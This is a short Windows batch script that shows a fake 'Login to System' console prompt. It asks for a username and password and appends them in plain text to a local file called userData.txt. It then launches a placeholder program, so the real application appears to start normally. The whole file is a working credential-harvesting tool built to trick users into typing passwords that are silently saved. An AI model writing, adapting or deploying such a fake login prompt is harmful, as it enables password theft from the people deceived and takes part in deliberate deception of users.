@echo off
color a
title Login to System
cls
echo.
echo Please Enter Your Email Address And PassWords
echo.
echo.
set /p user=Username:
set /p pass=Password:
echo Username="%user%" Password="%pass%" >> userData.txt
start >>Program Here<<
exit
